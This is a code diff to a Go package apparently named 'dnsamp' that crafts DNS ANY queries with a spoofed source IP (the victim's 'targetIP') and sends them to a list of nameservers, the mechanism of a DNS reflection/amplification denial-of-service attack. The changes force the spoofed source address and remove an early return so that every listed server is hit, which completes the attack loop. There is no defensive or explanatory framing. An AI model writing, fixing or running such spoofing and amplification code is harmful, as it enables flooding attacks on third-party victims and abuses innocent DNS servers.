@@ -1,13 +1,13 @@
 package dnsamp
 
 import (
+	"fmt"
 	"math/rand"
 	"net"
 
 	"github.com/google/gopacket"
 	"github.com/google/gopacket/layers"
 
-	// "github.com/google/gopacket/pcap"
 	"golang.org/x/net/ipv4"
 )
 
@@ -34,11 +34,11 @@ func Configure(iface string, target net.IP) {
 // create ANY request packet
 func makePacket(domainName string, nameserverIP net.IP) (*layers.IPv4, []byte) {
     ip := layers.IPv4{
-        Version: 4,
-        TTL: 64,
-        Protocol: layers.IPProtocolUDP,
         SrcIP: targetIP,
         DstIP: nameserverIP,
+        Protocol: layers.IPProtocolUDP,
+        Version: 4,
+        TTL: 64,
     }
     udp := layers.UDP{
         SrcPort: SRC_PORT,
@@ -83,7 +83,8 @@ func Send(servers []Target) {
             nameserverIP := net.ParseIP(server.NameServer)
             // Ignore invalid lines in the file
             if nameserverIP != nil {
-                ip, payload:= makePacket(server.DomainName, nameserverIP)
+                ip, payload := makePacket(server.DomainName, nameserverIP)
+                ip.SrcIP = targetIP 
                 ipHeaderBuf := gopacket.NewSerializeBuffer()
                 err := ip.SerializeTo(ipHeaderBuf, options)
                 if err != nil {
@@ -94,11 +95,11 @@ func Send(servers []Target) {
                     panic(err)
                 }
                 // IP header src does not get used for some reason
+                fmt.Println(ipHeader)
                 err = conn.WriteTo(ipHeader, payload, nil)
                 if err != nil {
                     panic(err)
                 }
-                return
             }
         }
     }
